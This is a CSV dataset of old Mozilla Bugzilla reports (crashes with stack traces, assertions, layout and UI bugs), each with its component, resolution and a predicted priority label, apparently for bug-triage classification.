Issue_id,Component,Title,Description,Status,Resolution,Text,Predicted_Priority
16837,Graphics,crash [@ UniscribeItem::SaveGlyphs(gfxTextRun*)],Firefox 3 beta 3 has a new topcrash. This still occurs on the trunk and appears; to be Windows-only.; ; See also: bp-ec169991-ded7-11dc-9d95-001a4bd43ef6; ; Crashing Thread; Frame 	Signature 	Source; 0 	UniscribeItem::SaveGlyphs(gfxTextRun*) 	mozilla/gfx/thebes/src/gfxWindowsFonts.cpp:1104; 1 	gfxWindowsFontGroup::InitTextRunUniscribe(gfxContext*; gfxTextRun*; unsigned short const*; unsigned int) 	mozilla/gfx/thebes/src/gfxWindowsFonts.cpp:1710; 2 	gfxWindowsFontGroup::MakeTextRun(unsigned char const*; unsigned int; gfxTextRunFactory::Parameters const*; unsigned int) 	mozilla/gfx/thebes/src/gfxWindowsFonts.cpp:607; 3 	gfxTextRun::SetSpaceGlyph(gfxFont*; gfxContext*; unsigned int) 	mozilla/gfx/thebes/src/gfxFont.cpp:1924; 4 	gfxFontGroup::MakeSpaceTextRun(gfxTextRunFactory::Parameters const*; unsigned int) 	mozilla/gfx/thebes/src/gfxFont.cpp:881; 5 	MakeTextRun 	mozilla/layout/generic/nsTextFrameThebes.cpp:408; 6 	BuildTextRunsScanner::BuildTextRunForFrames(void*) 	mozilla/layout/generic/nsTextFrameThebes.cpp:1616; 7 	BuildTextRunsScanner::FlushFrames(int; int) 	mozilla/layout/generic/nsTextFrameThebes.cpp:1053; 8 	BuildTextRunsScanner::ScanFrame(nsIFrame*) 	mozilla/layout/generic/nsTextFrameThebes.cpp:1219; 9 	BuildTextRuns 	mozilla/layout/generic/nsTextFrameThebes.cpp:970; 10 	nsTextFrame::EnsureTextRun(gfxContext*; nsIFrame*; nsLineList_iterator const*; unsigned int*) 	mozilla/layout/generic/nsTextFrameThebes.cpp:1786; 11 	nsTextFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsTextFrameThebes.cpp:5306; 12 	nsLineLayout::ReflowFrame(nsIFrame*; unsigned int&; nsHTMLReflowMetrics*; int&) 	mozilla/layout/generic/nsLineLayout.cpp:856; 13 	nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&; nsLineLayout&; nsLineList_iterator; nsIFrame*; LineReflowStatus*) 	mozilla/layout/generic/nsBlockFrame.cpp:3607; 14 	nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&; nsLineLayout&; nsLineList_iterator; int*; LineReflowStatus*; int) 	mozilla/layout/generic/nsBlockFrame.cpp:3429; 15 	nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&; nsLineList_iterator; int*) 	mozilla/layout/generic/nsBlockFrame.cpp:3278; 16 	nsBlockFrame::ReflowLine(nsBlockReflowState&; nsLineList_iterator; int*) 	mozilla/layout/generic/nsBlockFrame.cpp:2335; 17 	nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) 	mozilla/layout/generic/nsBlockFrame.cpp:1897; 18 	nsBlockFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsBlockFrame.cpp:936; 19 	nsAbsoluteContainingBlock::ReflowAbsoluteFrame(nsIFrame*; nsPresContext*; nsHTMLReflowState const&; int; int; int; nsIFrame*; unsigned int&; nsRect*) 	mozilla/layout/generic/nsAbsoluteContainingBlock.cpp:433; 20 	nsAbsoluteContainingBlock::Reflow(nsContainerFrame*; nsPresContext*; nsHTMLReflowState const&; unsigned int&; int; int; int; int; int; nsRect*) 	mozilla/layout/generic/nsAbsoluteContainingBlock.cpp:168; 21 	nsBlockFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsBlockFrame.cpp:1163; 22 	nsAbsoluteContainingBlock::ReflowAbsoluteFrame(nsIFrame*; nsPresContext*; nsHTMLReflowState const&; int; int; int; nsIFrame*; unsigned int&; nsRect*) 	mozilla/layout/generic/nsAbsoluteContainingBlock.cpp:433; 23 	nsAbsoluteContainingBlock::Reflow(nsContainerFrame*; nsPresContext*; nsHTMLReflowState const&; unsigned int&; int; int; int; int; int; nsRect*) 	mozilla/layout/generic/nsAbsoluteContainingBlock.cpp:168; 24 	nsBlockFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsBlockFrame.cpp:1163; 25 	nsContainerFrame::ReflowChild(nsIFrame*; nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; int; int; unsigned int; unsigned int&; nsOverflowContinuationTracker*) 	mozilla/layout/generic/nsContainerFrame.cpp:755; 26 	CanvasFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsHTMLFrame.cpp:584; 27 	nsContainerFrame::ReflowChild(nsIFrame*; nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; int; int; unsigned int; unsigned int&; nsOverflowContinuationTracker*) 	mozilla/layout/generic/nsContainerFrame.cpp:755; 28 	nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*; int; int; nsHTMLReflowMetrics*; int) 	mozilla/layout/generic/nsGfxScrollFrame.cpp:485; 29 	nsHTMLScrollFrame::ReflowContents(ScrollReflowState*; nsHTMLReflowMetrics const&) 	mozilla/layout/generic/nsGfxScrollFrame.cpp:569; 30 	nsHTMLScrollFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsGfxScrollFrame.cpp:770; 31 	nsContainerFrame::ReflowChild(nsIFrame*; nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; int; int; unsigned int; unsigned int&; nsOverflowContinuationTracker*) 	mozilla/layout/generic/nsContainerFrame.cpp:755; 32 	ViewportFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsViewportFrame.cpp:286; 33 	PresShell::DoReflow(nsIFrame*) 	mozilla/layout/base/nsPresShell.cpp:6197; 34 	PresShell::ProcessReflowCommands(int) 	mozilla/layout/base/nsPresShell.cpp:6302; 35 	PresShell::DoFlushPendingNotifications(mozFlushType; int) 	mozilla/layout/base/nsPresShell.cpp:4510; 36 	PresShell::ReflowEvent::Run() 	mozilla/layout/base/nsPresShell.cpp:6064; 37 	nsThread::ProcessNextEvent(int; int*) 	mozilla/xpcom/threads/nsThread.cpp:510; 38 	NS_ProcessNextEvent_P(nsIThread*; int) 	nsThreadUtils.cpp:227; 39 	nsBaseAppShell::Run() 	mozilla/widget/src/xpwidgets/nsBaseAppShell.cpp:154; 40 	nsAppStartup::Run() 	mozilla/toolkit/components/startup/src/nsAppStartup.cpp:181; 41 	PR_GetEnv 	; 42 	NS_internal_main(int; char**) 	mozilla/browser/app/nsBrowserApp.cpp:158; 43 	wmain 	mozilla/toolkit/xre/nsWindowsWMain.cpp:55; 44 	__tmainCRTStartup 	crtexe.c:594; 45 	BaseThreadInitThunk 	; 46 	ntdll.dll@0x3a9bc,RESOLVED,WORKSFORME,[TITLE] Title: crash [@ UniscribeItem::SaveGlyphs(gfxTextRun*)] | [DESC] Description: Firefox 3 beta 3 has a new topcrash. This still occurs on the trunk and appears; to be Windows-only.; ; See also: bp-ec169991-ded7-11dc-9d95-001a4bd43ef6; ; Crashing Thread; Frame 	Signature 	Source; 0 	UniscribeItem::SaveGlyphs(gfxTextRun*) 	mozilla/gfx/thebes/src/gfxWindowsFonts.cpp:1104; 1 	gfxWindowsFontGroup::InitTextRunUniscribe(gfxContext*; gfxTextRun*; unsigned short const*; unsigned int) 	mozilla/gfx/thebes/src/gfxWindowsFonts.cpp:1710; 2 	gfxWindowsFontGroup::MakeTextRun(unsigned char const*; unsigned int; gfxTextRunFactory::Parameters const*; unsigned int) 	mozilla/gfx/thebes/src/gfxWindowsFonts.cpp:607; 3 	gfxTextRun::SetSpaceGlyph(gfxFont*; gfxContext*; unsigned int) 	mozilla/gfx/thebes/src/gfxFont.cpp:1924; 4 	gfxFontGroup::MakeSpaceTextRun(gfxTextRunFactory::Parameters const*; unsigned int) 	mozilla/gfx/thebes/src/gfxFont.cpp:881; 5 	MakeTextRun 	mozilla/layout/generic/nsTextFrameThebes.cpp:408; 6 	BuildTextRunsScanner::BuildTextRunForFrames(void*) 	mozilla/layout/generic/nsTextFrameThebes.cpp:1616; 7 	BuildTextRunsScanner::FlushFrames(int; int) 	mozilla/layout/generic/nsTextFrameThebes.cpp:1053; 8 	BuildTextRunsScanner::ScanFrame(nsIFrame*) 	mozilla/layout/generic/nsTextFrameThebes.cpp:1219; 9 	BuildTextRuns 	mozilla/layout/generic/nsTextFrameThebes.cpp:970; 10 	nsTextFrame::EnsureTextRun(gfxContext*; nsIFrame*; nsLineList_iterator const*; unsigned int*) 	mozilla/layout/generic/nsTextFrameThebes.cpp:1786; 11 	nsTextFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsTextFrameThebes.cpp:5306; 12 	nsLineLayout::ReflowFrame(nsIFrame*; unsigned int&; nsHTMLReflowMetrics*; int&) 	mozilla/layout/generic/nsLineLayout.cpp:856; 13 	nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&; nsLineLayout&; nsLineList_iterator; nsIFrame*; LineReflowStatus*) 	mozilla/layout/generic/nsBlockFrame.cpp:3607; 14 	nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&; nsLineLayout&; nsLineList_iterator; int*; LineReflowStatus*; int) 	mozilla/layout/generic/nsBlockFrame.cpp:3429; 15 	nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&; nsLineList_iterator; int*) 	mozilla/layout/generic/nsBlockFrame.cpp:3278; 16 	nsBlockFrame::ReflowLine(nsBlockReflowState&; nsLineList_iterator; int*) 	mozilla/layout/generic/nsBlockFrame.cpp:2335; 17 	nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) 	mozilla/layout/generic/nsBlockFrame.cpp:1897; 18 	nsBlockFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsBlockFrame.cpp:936; 19 	nsAbsoluteContainingBlock::ReflowAbsoluteFrame(nsIFrame*; nsPresContext*; nsHTMLReflowState const&; int; int; int; nsIFrame*; unsigned int&; nsRect*) 	mozilla/layout/generic/nsAbsoluteContainingBlock.cpp:433; 20 	nsAbsoluteContainingBlock::Reflow(nsContainerFrame*; nsPresContext*; nsHTMLReflowState const&; unsigned int&; int; int; int; int; int; nsRect*) 	mozilla/layout/generic/nsAbsoluteContainingBlock.cpp:168; 21 	nsBlockFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsBlockFrame.cpp:1163; 22 	nsAbsoluteContainingBlock::ReflowAbsoluteFrame(nsIFrame*; nsPresContext*; nsHTMLReflowState const&; int; int; int; nsIFrame*; unsigned int&; nsRect*) 	mozilla/layout/generic/nsAbsoluteContainingBlock.cpp:433; 23 	nsAbsoluteContainingBlock::Reflow(nsContainerFrame*; nsPresContext*; nsHTMLReflowState const&; unsigned int&; int; int; int; int; int; nsRect*) 	mozilla/layout/generic/nsAbsoluteContainingBlock.cpp:168; 24 	nsBlockFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsBlockFrame.cpp:1163; 25 	nsContainerFrame::ReflowChild(nsIFrame*; nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; int; int; unsigned int; unsigned int&; nsOverflowContinuationTracker*) 	mozilla/layout/generic/nsContainerFrame.cpp:755; 26 	CanvasFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsHTMLFrame.cpp:584; 27 	nsContainerFrame::ReflowChild(nsIFrame*; nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; int; int; unsigned int; unsigned int&; nsOverflowContinuationTracker*) 	mozilla/layout/generic/nsContainerFrame.cpp:755; 28 	nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*; int; int; nsHTMLReflowMetrics*; int) 	mozilla/layout/generic/nsGfxScrollFrame.cpp:485; 29 	nsHTMLScrollFrame::ReflowContents(ScrollReflowState*; nsHTMLReflowMetrics const&) 	mozilla/layout/generic/nsGfxScrollFrame.cpp:569; 30 	nsHTMLScrollFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsGfxScrollFrame.cpp:770; 31 	nsContainerFrame::ReflowChild(nsIFrame*; nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; int; int; unsigned int; unsigned int&; nsOverflowContinuationTracker*) 	mozilla/layout/generic/nsContainerFrame.cpp:755; 32 	ViewportFrame::Reflow(nsPresContext*; nsHTMLReflowMetrics&; nsHTMLReflowState const&; unsigned int&) 	mozilla/layout/generic/nsViewportFrame.cpp:286; 33 	PresShell::DoReflow(nsIFrame*) 	mozilla/layout/base/nsPresShell.cpp:6197; 34 	PresShell::ProcessReflowCommands(int) 	mozilla/layout/base/nsPresShell.cpp:6302; 35 	PresShell::DoFlushPendingNotifications(mozFlushType; int) 	mozilla/layout/base/nsPresShell.cpp:4510; 36 	PresShell::ReflowEvent::Run() 	mozilla/layout/base/nsPresShell.cpp:6064; 37 	nsThread::ProcessNextEvent(int; int*) 	mozilla/xpcom/threads/nsThread.cpp:510; 38 	NS_ProcessNextEvent_P(nsIThread*; int) 	nsThreadUtils.cpp:227; 39 	nsBaseAppShell::Run() 	mozilla/widget/src/xpwidgets/nsBaseAppShell.cpp:154; 40 	nsAppStartup::Run() 	mozilla/toolkit/components/startup/src/nsAppStartup.cpp:181; 41 	PR_GetEnv 	; 42 	NS_internal_main(int; char**) 	mozilla/browser/app/nsBrowserApp.cpp:158; 43 	wmain 	mozilla/toolkit/xre/nsWindowsWMain.cpp:55; 44 	__tmainCRTStartup 	crtexe.c:594; 45 	BaseThreadInitThunk 	; 46 	ntdll.dll@0x3a9bc | [META] Component: Graphics | [META] Status: RESOLVED | [META] Resolution: WORKSFORME,1
9537,Bookmarks & History,Replace History|Clear history with Tools|Clear private data,The clear history and clear private data commands overlap; we only need one of these commands. The clear private data function should be moved to the history menu where it makes more sense and we can delete the current clear history item.,RESOLVED,DUPLICATE,[TITLE] Title: Replace History|Clear history with Tools|Clear private data | [DESC] Description: The clear history and clear private data commands overlap; we only need one of these commands. The clear private data function should be moved to the history menu where it makes more sense and we can delete the current clear history item. | [META] Component: Bookmarks & History | [META] Status: RESOLVED | [META] Resolution: DUPLICATE,1
11521,XUL,sched: Finish splitter,Finish splitter	2d	evaughan	0%,VERIFIED,FIXED,[TITLE] Title: sched: Finish splitter | [DESC] Description: Finish splitter	2d	evaughan	0% | [META] Component: XUL | [META] Status: VERIFIED | [META] Resolution: FIXED,1
17482,SVG,Crash [@ nsSVGFETileElement::Filter],Created attachment 358622; testcase (crashes Firefox when loaded); ; ###!!! ASSERTION: Tile overflows surface rect; this code cant handle it: instance->GetSurfaceRect().Contains(tile); file /Users/jruderman/central/content/svg/content/src/nsSVGFilters.cpp; line 2857; ; Crash [@ nsSVGFETileElement::Filter] trying to access 0x1ed51400.; ; Bug 448244s testcase triggers the same assertion; but does not crash.,VERIFIED,FIXED,[TITLE] Title: Crash [@ nsSVGFETileElement::Filter] | [DESC] Description: Created attachment 358622; testcase (crashes Firefox when loaded); ; ###!!! ASSERTION: Tile overflows surface rect; this code cant handle it: instance->GetSurfaceRect().Contains(tile); file /Users/jruderman/central/content/svg/content/src/nsSVGFilters.cpp; line 2857; ; Crash [@ nsSVGFETileElement::Filter] trying to access 0x1ed51400.; ; Bug 448244s testcase triggers the same assertion; but does not crash. | [META] Component: SVG | [META] Status: VERIFIED | [META] Resolution: FIXED,1
12640,Layout: Form Controls,[IMGBTN]dragging from image button submits form (input type=image),Build ID: just pulled; ; Steps to Reproduce:; ; (1) Go to http://www.kde.com/; (2) Mousedown on one of the Go image buttons; (3) Drag away from the image button and release the mousebutton; ; Actual Result:; Form submission; as if you had clicked on the button; ; Expected Result:; Nothing -- the image button should behave like all other buttons; such that ; dragging away from the button and releasing the mousebutton shouldnt trigger ; the button action (so as to give the user a way out once he/she has already ; begun clicking on the buttom); ; I believe the problem here is that d&d is somehow interfering.  However; button ; behavior should override image d&d behavior in this case.,RESOLVED,FIXED,[TITLE] Title: [IMGBTN]dragging from image button submits form (input type=image) | [DESC] Description: Build ID: just pulled; ; Steps to Reproduce:; ; (1) Go to http://www.kde.com/; (2) Mousedown on one of the Go image buttons; (3) Drag away from the image button and release the mousebutton; ; Actual Result:; Form submission; as if you had clicked on the button; ; Expected Result:; Nothing -- the image button should behave like all other buttons; such that ; dragging away from the button and releasing the mousebutton shouldnt trigger ; the button action (so as to give the user a way out once he/she has already ; begun clicking on the buttom); ; I believe the problem here is that d&d is somehow interfering.  However; button ; behavior should override image d&d behavior in this case. | [META] Component: Layout: Form Controls | [META] Status: RESOLVED | [META] Resolution: FIXED,3
13038,Networking,browsers cannot be stopped while reading huge site,From Bugzilla Helper:; User-Agent: Mozilla/5.0 (X11; U; Linux 2.2.16-22 i686; en-US; 0.8.1); BuildID:    2001032311; ; Browser cannot be stopped while receiving huge (unlimited) amounts of data.; ; Reproducible: Always; Steps to Reproduce:; 1. Enter above URL; ; Actual Results:  Browser GUI is unresponsible and dont show again when window; is hidden and showed again.; ; Expected Results:  GUI is responsive; browser can be stopped by pressing Stop; button.; ; There is a PHP script that enters an infinite loop and sends data to browser; infinitely.; This is obvious bug in my script but this clearly demonstates bug in Mozilla.,RESOLVED,DUPLICATE,[TITLE] Title: browsers cannot be stopped while reading huge site | [DESC] Description: From Bugzilla Helper:; User-Agent: Mozilla/5.0 (X11; U; Linux 2.2.16-22 i686; en-US; 0.8.1); BuildID:    2001032311; ; Browser cannot be stopped while receiving huge (unlimited) amounts of data.; ; Reproducible: Always; Steps to Reproduce:; 1. Enter above URL; ; Actual Results:  Browser GUI is unresponsible and dont show again when window; is hidden and showed again.; ; Expected Results:  GUI is responsive; browser can be stopped by pressing Stop; button.; ; There is a PHP script that enters an infinite loop and sends data to browser; infinitely.; This is obvious bug in my script but this clearly demonstates bug in Mozilla. | [META] Component: Networking | [META] Status: RESOLVED | [META] Resolution: DUPLICATE,2
10785,Layout: Tables,Form; image; text lay out outside of table,Using 1/28 build on Win 95; Win 98; Win NT; Mac 8.5; ; Open URL. On the right side of the main table; there are the following sections:; Whats Hot; Quick Search; Featured Software.; ; Mac 8.5 is OK.; ; Windows platforms:; Expected result: items within table (text; form; image) should lay out within; table; Actual result: items lay out outside of table (partially); ; Phillip - can you test this on Linux?,VERIFIED,WORKSFORME,[TITLE] Title: Form; image; text lay out outside of table | [DESC] Description: Using 1/28 build on Win 95; Win 98; Win NT; Mac 8.5; ; Open URL. On the right side of the main table; there are the following sections:; Whats Hot; Quick Search; Featured Software.; ; Mac 8.5 is OK.; ; Windows platforms:; Expected result: items within table (text; form; image) should lay out within; table; Actual result: items lay out outside of table (partially); ; Phillip - can you test this on Linux? | [META] Component: Layout: Tables | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
12457,XPCOM,M17 crash after sitting idle for 8 hours,Build id 2000080712 on MacOS 9.; ; I left a browser window up overnight; and when I came back the Mac was in; Macsbug.  As nearly as I can tell from files written by another application; (SETI@home); the crash occurred after  about 8 hours.  As I recall; the page I; left displayed had no animations but might have been running a JavaScript; setInterval.  Ill attach a stack trace.  It referenced unmapped memory while in; an idle loop.,VERIFIED,WONTFIX,[TITLE] Title: M17 crash after sitting idle for 8 hours | [DESC] Description: Build id 2000080712 on MacOS 9.; ; I left a browser window up overnight; and when I came back the Mac was in; Macsbug.  As nearly as I can tell from files written by another application; (SETI@home); the crash occurred after  about 8 hours.  As I recall; the page I; left displayed had no animations but might have been running a JavaScript; setInterval.  Ill attach a stack trace.  It referenced unmapped memory while in; an idle loop. | [META] Component: XPCOM | [META] Status: VERIFIED | [META] Resolution: WONTFIX,2
15897,Layout,[FIX]nsImageMap is too eager to invalidate on attribute changes,STEPS TO REPRODUCE:; ; 1)  Load https://bugzilla.mozilla.org/attachment.cgi?id=162706; 2)  Watch it freeze up for 2-3 seconds; ; EXPECTED RESULTS: no freeze; ; The problem is that we rebuild the imagemap on every attr set; which makes the; whole thing O(N^2) in the number of <area>s.  Since none of the attrs relevant; to the functioning of the imagemap are changing; we shouldnt be rebuilding.,RESOLVED,FIXED,[TITLE] Title: [FIX]nsImageMap is too eager to invalidate on attribute changes | [DESC] Description: STEPS TO REPRODUCE:; ; 1)  Load https://bugzilla.mozilla.org/attachment.cgi?id=162706; 2)  Watch it freeze up for 2-3 seconds; ; EXPECTED RESULTS: no freeze; ; The problem is that we rebuild the imagemap on every attr set; which makes the; whole thing O(N^2) in the number of <area>s.  Since none of the attrs relevant; to the functioning of the imagemap are changing; we shouldnt be rebuilding. | [META] Component: Layout | [META] Status: RESOLVED | [META] Resolution: FIXED,1
11767,Editor,[PP] Linux: Canceling Insert Table dialog hangs apprunner,linux; apprunner.; Editor; choose the insert table dialog.; After the dialog comes up; but before typing anything;; decide not to insert a table; this was all a big mistake.; Hit cancel; the dialog goes grey; youre locked in a mode;; aint going downtown tonight.  (need to kill apprunner),VERIFIED,WORKSFORME,[TITLE] Title: [PP] Linux: Canceling Insert Table dialog hangs apprunner | [DESC] Description: linux; apprunner.; Editor; choose the insert table dialog.; After the dialog comes up; but before typing anything;; decide not to insert a table; this was all a big mistake.; Hit cancel; the dialog goes grey; youre locked in a mode;; aint going downtown tonight.  (need to kill apprunner) | [META] Component: Editor | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
9593,Bookmarks & History,Crash and asserts when clicking on context-menu items places history [@ nsVoidArray::IndexOf],Steps to reproduce:; 1. Open Places; right-click on a history-item and choose Delete; 2. Result: the history-item is deleted like expected; 3. Now rightclick on another history-item and choose Open; 3. It opens; like expected; 4. On the same item; choose Cut; or Copy; 5. An assert appears; 6. Choose Delete ; 7. Firefox crashes; ; Contents assert:; ; ASSERT: null node; Stack Trace:; 0:PC_nodeIsFolder(null); 1:PC_wrapNode[xpconnect wrapped nsINavHistoryResultNode];text/x-moz-place); 2:generateChunk(text/x-moz-place); 3:(); 4:(); 5:oncommand([objectMouseEvent]); ; This worked well in 1.9a1_2006041720 but got problematic in 1.9a1_2006041722.,RESOLVED,INVALID,[TITLE] Title: Crash and asserts when clicking on context-menu items places history [@ nsVoidArray::IndexOf] | [DESC] Description: Steps to reproduce:; 1. Open Places; right-click on a history-item and choose Delete; 2. Result: the history-item is deleted like expected; 3. Now rightclick on another history-item and choose Open; 3. It opens; like expected; 4. On the same item; choose Cut; or Copy; 5. An assert appears; 6. Choose Delete ; 7. Firefox crashes; ; Contents assert:; ; ASSERT: null node; Stack Trace:; 0:PC_nodeIsFolder(null); 1:PC_wrapNode[xpconnect wrapped nsINavHistoryResultNode];text/x-moz-place); 2:generateChunk(text/x-moz-place); 3:(); 4:(); 5:oncommand([objectMouseEvent]); ; This worked well in 1.9a1_2006041720 but got problematic in 1.9a1_2006041722. | [META] Component: Bookmarks & History | [META] Status: RESOLVED | [META] Resolution: INVALID,1
17543,Layout,[FIX]ASSERTION: Bad offset looking for glyphrun with ireflow; bidi,Created attachment 362331; testcase; ; Steps to reproduce:; 1. Apply the ireflow patch (bug 67752 comment 56).; 2. Set the following environment variables:;   export GECKO_REFLOW_INTERRUPT_MODE=counter;   export GECKO_REFLOW_INTERRUPT_CHECKS_TO_SKIP=0;   export GECKO_REFLOW_INTERRUPT_FREQUENCY=0; 3. Load the testcase; 4. Wait a few seconds; ; Result:; ; ###!!! ASSERTION: Invalid offset: aOffset <= mSkipChars->mCharCount; file /Users/jruderman/central/gfx/thebes/src/gfxSkipChars.cpp; line 92; ; ###!!! ASSERTION: Substring out of range: aStart + aLength <= mCharacterCount; file /Users/jruderman/central/gfx/thebes/src/gfxFont.cpp; line 1781; ; ###!!! ASSERTION: Bad offset looking for glyphrun: aOffset <= mCharacterCount; file /Users/jruderman/central/gfx/thebes/src/gfxFont.cpp; line 2160,VERIFIED,FIXED,[TITLE] Title: [FIX]ASSERTION: Bad offset looking for glyphrun with ireflow; bidi | [DESC] Description: Created attachment 362331; testcase; ; Steps to reproduce:; 1. Apply the ireflow patch (bug 67752 comment 56).; 2. Set the following environment variables:;   export GECKO_REFLOW_INTERRUPT_MODE=counter;   export GECKO_REFLOW_INTERRUPT_CHECKS_TO_SKIP=0;   export GECKO_REFLOW_INTERRUPT_FREQUENCY=0; 3. Load the testcase; 4. Wait a few seconds; ; Result:; ; ###!!! ASSERTION: Invalid offset: aOffset <= mSkipChars->mCharCount; file /Users/jruderman/central/gfx/thebes/src/gfxSkipChars.cpp; line 92; ; ###!!! ASSERTION: Substring out of range: aStart + aLength <= mCharacterCount; file /Users/jruderman/central/gfx/thebes/src/gfxFont.cpp; line 1781; ; ###!!! ASSERTION: Bad offset looking for glyphrun: aOffset <= mCharacterCount; file /Users/jruderman/central/gfx/thebes/src/gfxFont.cpp; line 2160 | [META] Component: Layout | [META] Status: VERIFIED | [META] Resolution: FIXED,1
